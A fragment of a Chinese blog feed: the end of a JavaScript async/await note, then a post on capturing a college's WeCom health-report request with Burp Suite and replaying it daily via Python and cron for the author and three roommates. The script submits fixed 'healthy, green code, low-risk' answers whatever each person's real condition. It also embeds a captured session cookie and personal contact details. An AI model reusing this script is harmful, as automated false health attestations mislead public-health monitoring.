<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">async function asyncFunc() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        await new Promise(function (resolve, reject) &#123;</span><br><span class="line">            throw &quot;Some error&quot;; &#x2F;&#x2F; 或者 reject(&quot;Some error&quot;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        console.log(err);</span><br><span class="line">        &#x2F;&#x2F; 会输出 Some error</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">asyncFunc();</span><br></pre></td></tr></table></figure>

<p>如果 Promise 有一个正常的返回值，await 语句也会返回它：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">async function asyncFunc() &#123;</span><br><span class="line">    let value &#x3D; await new Promise(</span><br><span class="line">        function (resolve, reject) &#123;</span><br><span class="line">            resolve(&quot;Return value&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">    console.log(value);</span><br><span class="line">&#125;</span><br><span class="line">asyncFunc();</span><br></pre></td></tr></table></figure>

<p>程序会输出:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Return value</span><br></pre></td></tr></table></figure>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.runoob.com/js/js-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/js/js-tutorial.html</a></p>
<p><a href="https://blog.csdn.net/Richard1997/article/details/87350174" target="_blank" rel="noopener">https://blog.csdn.net/Richard1997/article/details/87350174</a></p>
<p><a href="https://www.huaweicloud.com/articles/f98d0e64fb1b281f60b7209c750528fc.html" target="_blank" rel="noopener">https://www.huaweicloud.com/articles/f98d0e64fb1b281f60b7209c750528fc.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Python与crontab实现自动化每日健康上报</title>
    <url>/2021/11/06/Automated-daily-health-reporting-with-Python-and-Crontab/</url>
    <content><![CDATA[<p>持续了快两年的疫情，改变了很多事也打乱了很多人生活的节奏(对我这个死宅来说几乎没啥影响)，就是每天的健康上报经常会忘，所以为了偷懒，就突发奇想利用脚本实现每日自动化上报。<a id="more"></a></p>
<h2 id="实现过程分析"><a href="#实现过程分析" class="headerlink" title="实现过程分析"></a>实现过程分析</h2><h3 id="电脑上对模拟器里的企业微信进行抓包分析"><a href="#电脑上对模拟器里的企业微信进行抓包分析" class="headerlink" title="电脑上对模拟器里的企业微信进行抓包分析"></a>电脑上对模拟器里的企业微信进行抓包分析</h3><p>因为健康打卡的url链接在首届和电脑的浏览器上不能直接打开，所以我想只能通过模拟器里装企业微信进行抓包分析，我用了网上比较推荐的夜神模拟器，用Bp抓包，首先设置模拟器wifi代理，然后安装CA证书，就可以将流量代理到bp上，这些基操就不多写了（网上文章很多），直接上图</p>
<p>一共抓到三个包</p>
<p>第一个包是一个302跳转，跳转到第二个包，这个包不知道是什么意思，感觉有点多余</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106181215379.png" alt="image-20211106181215379"></p>
<p>第二个包才是真正的提交页面</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106181306381.png" alt="image-20211106181306381"></p>
<p>第三个是表单提交的包</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106181408269.png" alt="image-20211106181408269"></p>
<p>分析请求的url里，前面都是固定的，只有两个参数是变化的，一个是_time/后面的时间戳，另一个就是code/后面的一串编码，不知道是什么编码，我尝试用cyberchef的magic模块来进行检测</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106182907524.png" alt="image-20211106182907524"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106183308291.png" alt="image-20211106183308291"></p>
<p>看起来好像是Base64编码，然而解密出来的内容是加密的，不知道算法就很难搞，不知道这个code参数是什么意思，这里就不管它了，因为我经过测试发现，即使只用这个单一不变的code来发包也同样能够健康上报成功。</p>
<p>然后分析POST包的提交内容，显然是url编码，由于我Bp字体乱码问题用不了decode模块，直接去在线url解码平台，解码之后的数据如下</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106184420185.png" alt="image-20211106184420185"></p>
<p>其实就是健康上报页面的form表单内的内容，这里我把学号和手机号进行了马赛克的脱敏操作防止信息泄露，举个例子其中的dkjtdz参数就是健康上报页面的打卡具体地址（必填），这里我一直写的是杭商院，其他的一些参数（如地区、绿码等等）对每个人来说都是通用的不用改，只需要改姓名、学号、手机号就行了。</p>
<p>分析好之后就可以用Python进行POST发包实现健康上报了</p>
<h3 id="利用Python的requests模块模拟POST请求发包来实现健康上报"><a href="#利用Python的requests模块模拟POST请求发包来实现健康上报" class="headerlink" title="利用Python的requests模块模拟POST请求发包来实现健康上报"></a>利用Python的requests模块模拟POST请求发包来实现健康上报</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import smtplib</span><br><span class="line">import time</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.utils import formataddr</span><br><span class="line"></span><br><span class="line"># name&#x3D;input(&quot;请输入姓名:&quot;)</span><br><span class="line"># xh&#x3D;input(&quot;请输入学号:&quot;)</span><br><span class="line"># sj&#x3D;input(&quot;请输入手机号:&quot;)</span><br><span class="line"># email&#x3D;input(&quot;请输入邮箱:&quot;)</span><br><span class="line"></span><br><span class="line">name&#x3D;&quot;朱文豪&quot;</span><br><span class="line">xh&#x3D;&quot;xxxxxxxx34&quot; </span><br><span class="line">sj&#x3D;&quot;xxxxxxxxxxx&quot;</span><br><span class="line">email&#x3D;&quot;1252448508@qq.com&quot;</span><br><span class="line">time&#x3D;time.strftime(&quot;%Y&#x2F;%m&#x2F;%d&quot;, time.localtime())</span><br><span class="line"></span><br><span class="line">def healthsubmit(name,xh,sj,time,email):</span><br><span class="line">    url&#x3D;&quot;http:&#x2F;&#x2F;qy.zjhzcc.edu.cn&#x2F;ami&#x2F;ihs.php&#x2F;Index&#x2F;icon_yqtb&#x2F;id&#x2F;27&#x2F;_sign&#x2F;5E29795015AFD5127A14DFA86A579F7140B159F3&#x2F;wtype&#x2F;student&#x2F;_time&#x2F;1635955731&#x2F;code&#x2F;qJP0xu9Cgiu9QUvpypw9gAJyBktl8jFiBQ37YZ90Q-A.html&quot;</span><br><span class="line">    headers&#x3D;&#123;</span><br><span class="line">        &quot;Host&quot;: &quot;qy.zjhzcc.edu.cn&quot;,</span><br><span class="line">        &quot;Content-Length&quot;:&quot;565&quot;,</span><br><span class="line">        &quot;Cache-Control&quot;: &quot;max-age&#x3D;0&quot;,</span><br><span class="line">        &quot;Origin&quot;: &quot;http:&#x2F;&#x2F;qy.zjhzcc.edu.cn&quot;,</span><br><span class="line">        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Linux; Android 7.1.2; SM-G955N Build&#x2F;NRD90M.G955NKSU1AQDC; wv) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Version&#x2F;4.0 Chrome&#x2F;75.0.3770.143 Mobile Safari&#x2F;537.36 wxwork&#x2F;3.1.19 ColorScheme&#x2F;Light MicroMessenger&#x2F;7.0.1 NetType&#x2F;WIFI Language&#x2F;zh Lang&#x2F;zh&quot;,</span><br><span class="line">        &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3&quot;,</span><br><span class="line">        &quot;Referer&quot;: &quot;http:&#x2F;&#x2F;qy.zjhzcc.edu.cn&#x2F;ami&#x2F;ihs.php&#x2F;Index&#x2F;icon_yqtb&#x2F;id&#x2F;27&#x2F;_sign&#x2F;5E29795015AFD5127A14DFA86A579F7140B159F3&#x2F;wtype&#x2F;student&#x2F;_time&#x2F;1635955731&#x2F;code&#x2F;qJP0xu9Cgiu9QUvpypw9gAJyBktl8jFiBQ37YZ90Q-A.html&quot;,</span><br><span class="line">        &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7&quot;,</span><br><span class="line">        &quot;Cookie&quot;: &quot;PHPSESSID&#x3D;ph5pv47p86i2kk54es8kk8nm67&quot;,</span><br><span class="line">        &quot;X-Requested-With&quot;: &quot;com.tencent.wework&quot;,</span><br><span class="line">        &quot;Connection&quot;: &quot;close&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data&#x3D;&#123;</span><br><span class="line">        &quot;tbrq&quot;:time,</span><br><span class="line">        &quot;txr&quot;:name,</span><br><span class="line">        &quot;lx&quot;:&quot;Xs&quot;,</span><br><span class="line">        &quot;gh&quot;:xh,</span><br><span class="line">        &quot;bm&quot;:&quot;人工智能与电子商务学院&quot;,</span><br><span class="line">        &quot;bj&quot;:&quot;计科1901&quot;,</span><br><span class="line">        &quot;sj&quot;:sj,</span><br><span class="line">        &quot;jtzz&quot;:&quot;低风险区（大杭州内）&quot;,</span><br><span class="line">        &quot;jtdz&quot;:&quot;&quot;,</span><br><span class="line">        &quot;addr&quot;:&quot;浙江省杭州市&quot;,</span><br><span class="line">        &quot;ip&quot;:&quot;36.22.152.16&quot;,</span><br><span class="line">        &quot;area&quot;:&quot;浙江省&quot;,</span><br><span class="line">        &quot;dkjtdz&quot;:&quot;杭商院&quot;,</span><br><span class="line">        &quot;yqfk&quot;:&quot;健康&quot;,</span><br><span class="line">        &quot;jkm&quot;:&quot;已申领，绿码&quot;,</span><br><span class="line">        &quot;xmfl&quot;:&quot;否&quot;,</span><br><span class="line">        &quot;hxrq&quot;:&quot;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    res&#x3D;requests.post(url,headers&#x3D;headers,data&#x3D;data)</span><br><span class="line">    #print(res.text)</span><br><span class="line">    my_sender &#x3D; &#39;1252448508@qq.com&#39;  # 发件人邮箱账号</span><br><span class="line">    my_pass &#x3D; &#39;xxxxxxxxx&#39;  # 发件人邮箱密码</span><br><span class="line">    my_user &#x3D; email  # 收件人邮箱账号，我这边发送给自己</span><br><span class="line">    ret &#x3D; True</span><br><span class="line">    try:</span><br><span class="line">        msg &#x3D; MIMEText(res.text, &#39;plain&#39;, &#39;utf-8&#39;)</span><br><span class="line">        msg[&#39;From&#39;] &#x3D; my_sender  # 括号里的对应发件人邮箱昵称、发件人邮箱账号</span><br><span class="line">        msg[&#39;To&#39;] &#x3D; my_user  # 括号里的对应收件人邮箱昵称、收件人邮箱账号</span><br><span class="line">        msg[&#39;Subject&#39;] &#x3D; &quot;每日疫情签到情况：&quot;  # 邮件的主题，也可以说是标题</span><br><span class="line"></span><br><span class="line">        server &#x3D; smtplib.SMTP_SSL(&quot;smtp.qq.com&quot;, 465)  # 发件人邮箱中的SMTP服务器，端口是25</span><br><span class="line">        server.login(my_sender, my_pass)  # 括号中对应的是发件人邮箱账号、邮箱密码</span><br><span class="line">        server.sendmail(my_sender, my_user, msg.as_string())  # 括号中对应的是发件人邮箱账号、收件人邮箱账号、发送邮件</span><br><span class="line">        server.quit()  # 关闭连接</span><br><span class="line">    except Exception:  # 如果 try 中的语句没有执行，则会执行下面的 ret&#x3D;False</span><br><span class="line">        ret &#x3D; False</span><br><span class="line">    if ret:</span><br><span class="line">        print(&quot;邮件发送成功&quot;)</span><br><span class="line">        print(&quot;健康上报完成&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;邮件发送失败&quot;)</span><br><span class="line">        print(&quot;健康上报失败&quot;)</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    # print(&quot;---------------&quot;)</span><br><span class="line">    # print(&quot;[*]杭商院健康上报脚本启动&quot;)</span><br><span class="line">    healthsubmit(name,xh,sj,time,email)</span><br><span class="line">    healthsubmit(&quot;金正阳&quot;,&quot;xxxxxxxx31&quot;,&quot;xxxxxxxxxxx&quot;,time,&quot;xxxxxxx@qq.com&quot;)</span><br><span class="line">    healthsubmit(&quot;卢雨诚&quot;,&quot;xxxxxxxx36&quot;,&quot;xxxxxxxxxxx&quot;,time,&quot;xxxxxxx@qq.com&quot;)</span><br><span class="line">    healthsubmit(&quot;黄晔莹&quot;,&quot;xxxxxxxx26&quot;,&quot;xxxxxxxxxxx&quot;,time,&quot;xxxxxxx@qq.com&quot;)</span><br></pre></td></tr></table></figure>

<p>代码分为两个部分，第一部分是用requests模块进行POST请求，第二部分是用smtplib库将POST请求返回的上报完成情况发送到个人邮箱进行提醒，两部分都在healthsubmit函数中完成，出于安全的考虑我将代码中我和我室友的个人信息（学号、手机号）以及smtp的授权码进行了脱敏，本地测试成功，然后就将文件放到服务器上设置crontab定时任务，实现每日自动上报。</p>
<h3 id="crontab定时任务设置"><a href="#crontab定时任务设置" class="headerlink" title="crontab定时任务设置"></a>crontab定时任务设置</h3><p>基本思路就是先将写好的python脚本上传到服务器，然后写一个.sh文件作为入口，然后在.sh文件中执行该py脚本（不用sh入口直接在crontab里运行py脚本也可以），然后设置crontab定时任务，让服务器在每天的0时1分的时候自动执行健康上报的脚本。</p>
<p>1.在ssh客户端上安装lrzsz，然后就可以将本地文件直接传到服务器上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install lrzsz</span><br></pre></td></tr></table></figure>

<p>2.sh文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;ubuntu</span><br><span class="line">python3 healthsubmit.py &gt;&gt; hist</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106191417968.png" alt="c"></p>
<p>3.设置crontab定时任务</p>
<p>使用<code>crontab -e</code>命令来编辑cron任务，由于我之前用新的ssh客户端，用该命令进去是nano编辑器不是vim导致我不会退出，所以用了另一种方式来创建cron任务，先将要运行的命令放到rootcron文件，然后执行<code>crontab rootcron</code>就可以将该文件提交给cron进程。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/%E6%88%AA%E5%B1%8F2021-11-06%20%E4%B8%8B%E5%8D%887.18.00.png" alt="截屏2021-11-06 下午7.18.00"></p>
<p>前面的五个参数分别代表：分钟、小时、日、月、星期，第六个参数就是要运行的命令</p>
<p>所以我这里的意思是，在每天的0时1分自动运行写好的健康上报脚本，由于crontab运行完会有输出信息，日积月累，日志信息会非常大可能影响系统正常运行，所以就需要重定向，命令中的<code>&gt; /dev/null 2&gt;&amp;1</code>的意思就是将输出信息重定向到/dev/null，因为/dev/null代表空设备文件，它会丢弃一切写入的数据。</p>
<p>经过今天（11月6日）的测试，我和我室友都成功在0时1分的时候完成了健康上报，成功解放了双手</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106193853117.png" alt="image-20211106193853117"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106193908993.png" alt="image-20211106193908993"></p>
<h2 id="需要思考的问题"><a href="#需要思考的问题" class="headerlink" title="需要思考的问题"></a>需要思考的问题</h2><h3 id="code参数的具体含义"><a href="#code参数的具体含义" class="headerlink" title="code参数的具体含义"></a>code参数的具体含义</h3><p>这个问题虽然影响不大，但是如果能成功解码，获取其内容的话，就可以根据它的含义来让代码自动生成并编码进行拼接请求</p>
<h3 id="cookie的时间问题"><a href="#cookie的时间问题" class="headerlink" title="cookie的时间问题"></a>cookie的时间问题</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106195546706.png" alt="image-20211106195546706"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20211106200259415.png" alt="image-20211106200259415"></p>
<p>这是我在手机端抓的包，可以看到Set-Cookie的expire过期时间为1969-12-31T23:59:59.000Z，经过查询在Set-Cookie时，如果没有设置expire过期时间的话，chrome就会显示为1969-12-31T23:59:59.000Z，这个过期时间代表这个cookie是session cookie（会话cookie），浏览器关闭之后就失效了</p>
<p>但是奇怪的是，这个脚本我测试了两天，即使企业微信的cookie由于我在手机端和电脑端的切换导致cookie已经发生了变化，但是我用前两天的cookie进行请求也成功完成了健康上报，所以不知道这个cookie我能用到什么时候</p>
<h3 id="代码的可用性有待提高"><a href="#代码的可用性有待提高" class="headerlink" title="代码的可用性有待提高"></a>代码的可用性有待提高</h3><p>我写的Python代码太low了，需要事先在代码中写好需要上报的人的个人信息，我想如果之后有更多的人需要我帮忙挂的话，我又要改代码然后再重新传到服务器上，这显然是麻烦且没必要的。所以如果要改的话，我想应该再加上数据库的联动，有了数据库就可以通过对数据库的增删改来控制需要挂脚本的人，或者可以做个GUI的图形化工具，发给别人来提交个人信息到数据库。另外，还有一个思路就是创建一个excel表格，只要增删表格内容，然后让python自动获取表中的内容进行健康上报就行了。这两个方法本质上都是对一个可变数据集的读取然后循环进行健康上报。</p>
<p>这些仅仅是我的个人想法，如果以后有时间和需求的话，我可能会改进一下代码。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://testingpai.com/article/1612340448369" target="_blank" rel="noopener">http://testingpai.com/article/1612340448369</a></p>
<p><a href="https://www.cnblogs.com/wjrblogs/p/13683812.html" target="_blank" rel="noopener">https://www.cnblogs.com/wjrblogs/p/13683812.html</a></p>
<p><a href="https://tianzeee.github.io/2021/03/31/python-requests-learning/" target="_blank" rel="noopener">https://tianzeee.github.io/2021/03/31/python-requests-learning/</a></p>
<p><a href="https://www.cnblogs.com/netsa/p/7992280.html" target="_blank" rel="noopener">https://www.cnblogs.com/netsa/p/7992280.html</a></p>
<p><a href="https://www.136.la/shida/show-108833.html" target="_blank" rel="noopener">https://www.136.la/shida/show-108833.html</a></p>
<p><a href="https://www.petefreitag.com/item/854.cfm" target="_blank" rel="noopener">https://www.petefreitag.com/item/854.cfm</a></p>
<p><a href="https://dengxj.blog.csdn.net/article/details/104853830" target="_blank" rel="noopener">https://dengxj.blog.csdn.net/article/details/104853830</a></p>
<p><a href="https://blog.csdn.net/Deep_Rayne/article/details/109599171" target="_blank" rel="noopener">https://blog.csdn.net/Deep_Rayne/article/details/109599171</a></p>
<p><a href="https://www.cnblogs.com/kerrycode/p/3238346.html" target="_blank" rel="noopener">https://www.cnblogs.com/kerrycode/p/3238346.html</a></p>
<p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html" target="_blank" rel="noopener">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a></p>
]]></content>
      <categories>
        <category>校园相关</category>
      </categories>
  </entry>
</search>
